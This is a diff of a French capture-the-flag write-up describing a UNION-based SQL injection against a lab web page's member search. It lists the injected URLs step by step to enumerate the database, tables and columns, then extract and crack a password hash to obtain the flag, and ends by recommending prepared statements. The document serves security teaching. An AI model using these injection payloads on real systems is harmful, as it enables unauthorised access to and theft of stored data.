@@ -1,15 +1,23 @@
-Sur la page member, pour rechercher les membres pas ID, le requete ce fait en GET, j'ai donc ajouter dans l'url:
+Sur la page member.
+Pour rechercher les membres par ID, la requete ce fait en GET, j'ai donc ajouter dans l'url:
 
-1. http://10.1.1.5/?page=member&id=1 OR 1=1&Submit=Submit -> pour voir si ca marchait
+1. http://10.1.1.5/?page=member&id=1 OR 1=1&Submit=Submit ->
+pour voir si le param etait protege ou pas. Ceci nous affiche tous les membres contenus dans la table. On voit seulement l'ID, le first name et le surname. On voit un membre qui s'appelle Get the Flag. On veut donc voir les autres informations que contient cette table.
 
-2. http://10.1.1.5/?page=member&id=-1 union select @@version,database()&Submit=Submit -> donne le nom de la DB: Member_Sql_Injection
+2. http://10.1.1.5/?page=member&id=-1 union select @@version,database()&Submit=Submit ->
+Cela va nous donner le nom de la DB: Member_Sql_Injection
 
-3. http://10.1.1.5/?page=member&id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_shcema=database() -> donne le nom des tables
+3. http://10.1.1.5/?page=member&id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_shcema=database() ->
+Donne le nom de la table qui contient les membres: users.
 
-4. http://10.1.1.5/?page=member&id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()&Submit=Submit -> donne le nom des colonnes
+4. http://10.1.1.5/?page=member&id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()&Submit=Submit ->
+On veut maintenant connaitre les differents champs que contient cette table, cela donne le nom des colonnes. On voit qu'il y a un champ countersign et commentaire qui pourrait nous interesser.
 
-5. http://10.1.1.5/?page=member&id=1 or 1=1 union all select countersign, Commentaire from users&Submit=Submit -> donne le contenu de
+5. http://10.1.1.5/?page=member&id=1 or 1=1 union all select countersign, Commentaire from users&Submit=Submit ->
+Donne le contenu de
 Countersign: 5ff9d0165b4f92b14994e5c685cdce28
 Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 
-J'ai ensuite decrypte le countersign avec MD5 ce qui donne: FortyTwo, puis tout mis en majuscule puis encrypter en SHA256 pour trouver le flag.
+J'ai ensuite decrypte le countersign avec MD5 ce qui donne: FortyTwo, puis tout mis en minuscule puis encrypter en SHA256 pour trouver le flag.
+
+Il faut proteger et verifier ce qu'on recoit dans les params et faire des requetes preparees pour empecher d'injecter du code SQL.
